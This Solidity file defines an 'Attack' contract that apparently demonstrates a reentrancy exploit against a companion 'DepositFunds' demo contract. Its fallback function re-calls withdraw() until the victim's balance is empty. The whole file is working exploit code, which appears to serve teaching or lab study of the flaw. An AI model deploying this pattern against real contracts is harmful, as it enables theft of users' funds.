// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./goodContract.sol";

contract Attack {
    DepositFunds public depositFunds;

    constructor(address _depositFundsAddress) {
        depositFunds = DepositFunds(_depositFundsAddress);
    }

    // Fallback is called when DepositFunds sends Ether to this contract.
    fallback() external payable {
        if (address(depositFunds).balance > 0) {
            depositFunds.withdraw();
        }
    }

    function attack() public payable {
        depositFunds.deposit{value: msg.value}();
        depositFunds.withdraw();
    }


}